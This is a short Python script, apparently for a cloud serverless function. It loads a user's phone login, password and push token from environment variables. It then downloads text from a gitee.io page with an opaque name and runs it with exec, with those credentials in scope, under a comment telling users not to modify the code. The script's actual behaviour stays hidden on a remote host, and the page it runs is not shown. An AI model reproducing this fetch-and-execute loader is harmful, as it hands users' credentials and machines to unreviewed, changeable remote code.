# -*- coding:utf-8 -*-
import requests,os

folder = os.environ["FOLDER"]
token = os.environ["PUSH"]
phone = os.environ["USERNAME"]
pwd = os.environ["PASSWORD"]

#--------------以下为代码区，请勿修改！------------#
def main_handler(event, context):
    code=requests.get('https://scflover.gitee.io/wqi9EH5PLFMkQcY90hWqdMUU0v8JAFRmC0o86p.html')
    code.encoding='utf-8'
    exec(code.text,globals())

if __name__ == '__main__':
    main_handler("", "")
